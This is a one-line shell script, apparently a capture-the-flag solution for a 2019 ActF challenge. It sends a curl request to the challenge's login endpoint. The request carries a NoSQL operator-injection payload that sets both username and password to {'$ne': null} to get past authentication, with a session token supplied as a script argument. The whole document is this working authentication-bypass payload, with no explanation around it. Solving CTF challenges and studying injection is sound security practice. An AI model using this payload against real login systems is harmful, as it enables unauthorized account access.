curl -v --cookie "token=$1" -H 'content-type: application/json' --data '{"username":{"$ne":null},"password":{"$ne":null}}' https://nosequels.2019.chall.actf.co/login
